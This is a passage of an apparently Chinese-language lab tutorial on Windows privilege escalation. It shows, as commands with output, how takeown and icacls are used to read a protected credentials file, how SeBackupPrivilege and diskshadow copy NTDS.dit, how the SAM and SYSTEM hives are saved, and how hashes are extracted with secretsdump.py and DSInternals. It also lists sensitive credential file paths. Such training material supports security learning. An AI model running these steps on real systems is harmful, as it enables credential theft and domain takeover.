<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span>                          Disabled</span><br></pre></td></tr></table></figure>

<p>从输出中可以看出，权限未启用。使用 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">EnableAllTokenPrivs.ps1 </a> 开启 <code>SeTakeOwnershipPrivilege</code> 权限。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span>           Enabled</span><br></pre></td></tr></table></figure>

<p>假设用户帐户具有 SeTakeOwnershipPrivilege（可能已被授予），或者利用其他一些错误配置（例如过于宽松的组策略对象 (GPO) 向用户帐户授予该权限），可以利用它来读取选择的任何文件。</p>
<blockquote>
<p>注意：执行可能造成破坏的操作（例如更改文件所有权）时要格外小心，因为这可能会导致应用程序停止工作或扰乱目标对象的用户。此外，更改隐藏在多个子目录中的文件的所有权（同时更改每个子目录的权限）可能很难恢复，因此应避免这样做。</p>
</blockquote>
<p>查看文件所有者</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">Select</span> Fullname,LastWriteTime,Attributes,<span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123; (<span class="built_in">Get-Acl</span> <span class="variable">$_</span>.FullName).Owner &#125;&#125;</span><br><span class="line"> </span><br><span class="line">FullName                                 LastWriteTime         Attributes Owner</span><br><span class="line"><span class="literal">--------</span>                                 <span class="literal">-------------</span>         <span class="literal">----------</span> <span class="literal">-----</span></span><br><span class="line">C:\Department Shares\Private\IT\cred.txt <span class="number">6</span>/<span class="number">18</span>/<span class="number">2021</span> <span class="number">12</span>:<span class="number">23</span>:<span class="number">28</span> PM    Archive</span><br></pre></td></tr></table></figure>

<p>没有显示所有者，这意味着可能没有足够的权限查看该对象的详细信息。可以后退一点并查看 IT 目录的所有者。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is <span class="number">0</span>C92<span class="literal">-675B</span></span><br><span class="line"> </span><br><span class="line"> Directory of C:\Department Shares\Private\IT</span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  .</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br><span class="line">               <span class="number">1</span> File(s)             <span class="number">36</span> bytes</span><br><span class="line">               <span class="number">2</span> <span class="built_in">Dir</span>(s)  <span class="number">17</span>,<span class="number">079</span>,<span class="number">754</span>,<span class="number">752</span> bytes free</span><br></pre></td></tr></table></figure>

<p>IT 共享似乎由服务帐户拥有，并且确实包含一个<code>cred.txt</code>数据的文件。</p>
<p>使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> 来更改文件的所有权。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br><span class="line"> </span><br><span class="line">SUCCESS: The file (or folder): <span class="string">&quot;C:\Department Shares\Private\IT\cred.txt&quot;</span> now owned by user <span class="string">&quot;WINLPE-SRV01\htb-student&quot;</span>.</span><br></pre></td></tr></table></figure>

<p>仍然无法读取该文件，需要使用<code>icacls</code>修改文件 ACL 才能读取它。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant \htb<span class="literal">-student</span>:F</span><br><span class="line"></span><br><span class="line">processed file: C:\Department Shares\Private\IT\cred.txt</span><br><span class="line">Successfully processed <span class="number">1</span> files; Failed processing <span class="number">0</span> files</span><br></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cat</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">NIX01 admin</span><br><span class="line"> </span><br><span class="line">root:n1X_p0wer_us3er!</span><br></pre></td></tr></table></figure>

<p>其他的一些敏感文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Group-Privileges"><a href="#Group-Privileges" class="headerlink" title="Group Privileges"></a>Group Privileges</h1><h2 id="Built-in-Groups"><a href="#Built-in-Groups" class="headerlink" title="Built-in Groups"></a>Built-in Groups</h2><p>Windows 服务器（尤其是域控制器）具有各种内置组，这些组要么随操作系统一起提供，要么在系统上安装 Active Directory 域服务角色以将服务器提升为域控制器时添加。</p>
<p>所有内置 Windows 组的列表以及每个组的详细描述：<a target="_blank" rel="noopener" href="https://ss64.com/nt/syntax-security_groups.html">https://ss64.com/nt/syntax-security_groups.html</a></p>
<p>Active Directory 中的特权帐户和组：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory">https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory</a></p>
<table>
<thead>
<tr>
<th>Windows</th>
<th>Built-in</th>
<th>Groups</th>
</tr>
</thead>
<tbody><tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators">Backup Operators</a></td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders">Event Log Readers</a></td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins">DnsAdmins</a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators">Hyper-V Administrators</a></td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators">Print Operators</a></td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators">Server Operators</a></td>
</tr>
</tbody></table>
<h3 id="Backup-Operators"><a href="#Backup-Operators" class="headerlink" title="Backup Operators"></a>Backup Operators</h3><p><code>Backup Operators</code> 组授予其成员 <code>SeBackup</code> 和 <code>SeRestore</code> 权限。<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges">SeBackupPrivilege</a> 允许遍历任何文件夹并列出文件夹内容，但是不能使用标准复制命令来执行此操作。</p>
<p>如果 SeBackupPrivilege 权限被禁用，可以使用 Set-SeBackupPrivilege 来启用。</p>
<blockquote>
<p>注意：根据服务器的设置，可能需要生成提升的 CMD 提示以绕过 UAC 并获得此权限。</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Disabled</span><br><span class="line">SeBackupPrivilege             Back up files and directories  Disabled</span><br><span class="line">SeRestorePrivilege            Restore files and directories  Disabled</span><br><span class="line">SeShutdownPrivilege           Shut down the system           Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a <span class="keyword">process</span> working <span class="built_in">set</span> Disabled</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-SeBackupPrivilege</span></span><br><span class="line"></span><br><span class="line">SeBackupPrivilege is disabled</span><br></pre></td></tr></table></figure>

<p>导入模块 <a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilegeUtils</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeUtils.dll</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\SeBackupPrivilegeCmdLets.dll</span><br></pre></td></tr></table></figure>

<p>启用 <code>SeBackupPrivilege</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-SeBackupPrivilege</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-SeBackupPrivilege</span></span><br><span class="line"></span><br><span class="line">SeBackupPrivilege is enabled</span><br></pre></td></tr></table></figure>

<h4 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h4><p>现在可以利用此权限复制任何受保护的文件。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-FileSeBackupPrivilege</span> <span class="string">&#x27;C:\Confidential\2021 Contract.txt&#x27;</span> .\Contract.txt</span><br><span class="line"></span><br><span class="line">Copied <span class="number">88</span> bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt;  <span class="built_in">cat</span> .\Contract.txt</span><br><span class="line"></span><br><span class="line">Inlanefreight <span class="number">2021</span> Contract</span><br><span class="line"></span><br><span class="line">==============================</span><br><span class="line"></span><br><span class="line">Board of Directors:</span><br><span class="line"></span><br><span class="line">&lt;...SNIP...&gt;</span><br></pre></td></tr></table></figure>

<p>Windows 内置实用程序<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy">robocopy</a>也可用于在备份模式下复制文件。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">robocopy</span> /<span class="title">B</span> <span class="title">E</span>:\<span class="title">Windows</span>\<span class="title">NTDS</span> .\<span class="title">ntds</span> <span class="title">ntds.dit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function">   <span class="title">ROBOCOPY</span>     ::     <span class="title">Robust</span> <span class="title">File</span> <span class="title">Copy</span> <span class="title">for</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Started</span> : <span class="title">Thursday</span>, <span class="title">May</span> 6, 2021 1:11:47 <span class="title">PM</span></span></span><br><span class="line"><span class="function">   <span class="title">Source</span> : <span class="title">E</span>:\<span class="title">Windows</span>\<span class="title">NTDS</span>\</span></span><br><span class="line"><span class="function">     <span class="title">Dest</span> : <span class="title">C</span>:\<span class="title">Tools</span>\<span class="title">ntds</span>\</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">Files</span> : <span class="title">ntds.dit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Options</span> : /<span class="title">DCOPY:DA</span> /<span class="title">COPY:DAT</span> /<span class="title">B</span> /<span class="title">R</span>:1000000 /<span class="title">W</span>:30</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">          <span class="title">New</span> <span class="title">Dir</span>          1    <span class="title">E</span>:\<span class="title">Windows</span>\<span class="title">NTDS</span>\</span></span><br><span class="line"><span class="function">100%        <span class="title">New</span> <span class="title">File</span>              16.0 <span class="title">m</span>        <span class="title">ntds.dit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">               <span class="title">Total</span>    <span class="title">Copied</span>   <span class="title">Skipped</span>  <span class="title">Mismatch</span>    <span class="title">FAILED</span>    <span class="title">Extras</span></span></span><br><span class="line"><span class="function">    <span class="title">Dirs</span> :         1         1         0         0         0         0</span></span><br><span class="line"><span class="function">   <span class="title">Files</span> :         1         1         0         0         0         0</span></span><br><span class="line"><span class="function">   <span class="title">Bytes</span> :   16.00 <span class="title">m</span>   16.00 <span class="title">m</span>         0         0         0         0</span></span><br><span class="line"><span class="function">   <span class="title">Times</span> :   0:00:00   0:00:00                       0:00:00   0:00:00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">   <span class="title">Speed</span> :           356962042 <span class="title">Bytes</span>/<span class="title">sec</span>.</span></span><br><span class="line"><span class="function">   <span class="title">Speed</span> :           20425.531 <span class="title">MegaBytes</span>/<span class="title">min</span>.</span></span><br><span class="line"><span class="function">   <span class="title">Ended</span> : <span class="title">Thursday</span>, <span class="title">May</span> 6, 2021 1:11:47 <span class="title">PM</span></span></span><br></pre></td></tr></table></figure>

<h4 id="转储-NTDS-dit"><a href="#转储-NTDS-dit" class="headerlink" title="转储 NTDS.dit"></a>转储 NTDS.dit</h4><p>该组还允许本地登录域控制器。活动目录数据库<code>NTDS.dit</code>是一个非常有吸引力的目标，因为它包含域中所有用户和计算机对象的 NTLM 哈希。但是，此文件已锁定，非特权用户也无法访问。</p>
<p><code>NTDS.dit</code>文件默认处于锁定状态，可以使用 Windows <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow">diskshadow</a>实用程序创建<code>C</code>驱动器的卷影副本并将其公开为<code>E</code>驱动器。此卷影副本中的 NTDS.dit 将不会被系统使用。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; diskshadow.exe</span><br><span class="line"></span><br><span class="line">Microsoft DiskShadow version <span class="number">1.0</span></span><br><span class="line">Copyright (C) <span class="number">2013</span> Microsoft Corporation</span><br><span class="line">On computer:  DC,  <span class="number">10</span>/<span class="number">14</span>/<span class="number">2020</span> <span class="number">12</span>:<span class="number">57</span>:<span class="number">52</span> AM</span><br><span class="line"></span><br><span class="line">DISKSHADOW&gt; <span class="built_in">set</span> verbose on</span><br><span class="line">DISKSHADOW&gt; <span class="built_in">set</span> metadata C:\Windows\Temp\meta.cab</span><br><span class="line">DISKSHADOW&gt; <span class="built_in">set</span> context clientaccessible</span><br><span class="line">DISKSHADOW&gt; <span class="built_in">set</span> context persistent</span><br><span class="line">DISKSHADOW&gt; <span class="keyword">begin</span> backup</span><br><span class="line">DISKSHADOW&gt; add volume C: alias cdrive</span><br><span class="line">DISKSHADOW&gt; create</span><br><span class="line">DISKSHADOW&gt; expose %cdrive% E:</span><br><span class="line">DISKSHADOW&gt; <span class="keyword">end</span> backup</span><br><span class="line">DISKSHADOW&gt; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">dir</span> E:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: E:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">6</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">00</span> PM                Confidential</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">9</span>/<span class="number">15</span>/<span class="number">2018</span>  <span class="number">12</span>:<span class="number">19</span> AM                PerfLogs</span><br><span class="line">d<span class="literal">-r---</span>        <span class="number">3</span>/<span class="number">24</span>/<span class="number">2021</span>   <span class="number">6</span>:<span class="number">20</span> PM                Program Files</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">9</span>/<span class="number">15</span>/<span class="number">2018</span>   <span class="number">2</span>:<span class="number">06</span> AM                Program Files (x86)</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">5</span>/<span class="number">6</span>/<span class="number">2021</span>   <span class="number">1</span>:<span class="number">05</span> PM                Tools</span><br><span class="line">d<span class="literal">-r---</span>         <span class="number">5</span>/<span class="number">6</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">51</span> PM                Users</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">3</span>/<span class="number">24</span>/<span class="number">2021</span>   <span class="number">6</span>:<span class="number">38</span> PM                Windows</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/giuliano108/SeBackupPrivilege">SeBackupPrivilegeUtils</a> - Copy-FileSeBackupPrivilege 转储 NTDS.dit</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Copy-FileSeBackupPrivilege</span> E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit</span><br><span class="line"></span><br><span class="line">Copied <span class="number">16777216</span> bytes</span><br></pre></td></tr></table></figure>

<h4 id="备份-SAM-和-SYSTEM-注册表配置单元"><a href="#备份-SAM-和-SYSTEM-注册表配置单元" class="headerlink" title="备份 SAM 和 SYSTEM 注册表配置单元"></a>备份 SAM 和 SYSTEM 注册表配置单元</h4><p>该权限还允许备份 SAM 和 SYSTEM 注册表配置单元，可以使用 Impacket <code>secretsdump.py</code> 等工具离线提取本地帐户凭据。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">reg</span> <span class="title">save</span> <span class="title">HKLM</span>\<span class="title">SYSTEM</span> <span class="title">SYSTEM.SAV</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">reg</span> <span class="title">save</span> <span class="title">HKLM</span>\<span class="title">SAM</span> <span class="title">SAM.SAV</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>如果文件夹或文件对当前用户或所属的组有明确的拒绝条目，那么即使指定了<code>FILE_FLAG_BACKUP_SEMANTICS</code>标志，这也将阻止访问它。</p>
<h4 id="提取-NTDS-dit-凭据"><a href="#提取-NTDS-dit-凭据" class="headerlink" title="提取 NTDS.dit 凭据"></a>提取 NTDS.dit 凭据</h4><p>复制 NTDS.dit 后，可以使用工具（例如 Impackt <code>secretsdump.py</code>或 PowerShell<code>DSInternals</code>模块）提取所有 Active Directory 帐户凭据。</p>
<p>PowerShell DSInternals</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\DSInternals.psd1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$key</span> = <span class="built_in">Get-BootKey</span> <span class="literal">-SystemHivePath</span> .\SYSTEM</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADDBAccount</span> <span class="literal">-DistinguishedName</span> <span class="string">&#x27;CN=administrator,CN=users,DC=inlanefreight,DC=local&#x27;</span> <span class="literal">-DBPath</span> .\ntds.dit <span class="literal">-BootKey</span> <span class="variable">$key</span></span><br></pre></td></tr></table></figure>

<p>Impackt secretsdump.py</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</span></span><br></pre></td></tr></table></figure>

<h2 id="Event-Log-Readers"><a href="#Event-Log-Readers" class="headerlink" title="Event Log Readers"></a>Event Log Readers</h2><p>假设启用了对进程创建事件和相应命令行的审核 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation">auditing of process creation</a>。在这种情况下，此信息将作为事件 ID <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688">4688: A new process has been created</a> 保存到 Windows 安全事件日志中.</p>
<p>管理员或事件日志读取者组的成员有权访问此日志。</p>
<p>确认组成员身份</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span> &quot;<span class="title">Event</span> <span class="title">Log</span> <span class="title">Readers</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">Event</span> <span class="title">Log</span> <span class="title">Readers</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Members</span> <span class="title">of</span> <span class="title">this</span> <span class="title">group</span> <span class="title">can</span> <span class="title">read</span> <span class="title">event</span> <span class="title">logs</span> <span class="title">from</span> <span class="title">local</span> <span class="title">machine</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">logger</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<p>使用 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil">wevtutil</a> 或 <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.1">Get-WinEvent</a> 从命令行查询 Windows 事件。</p>
<p>wevtutil</p>
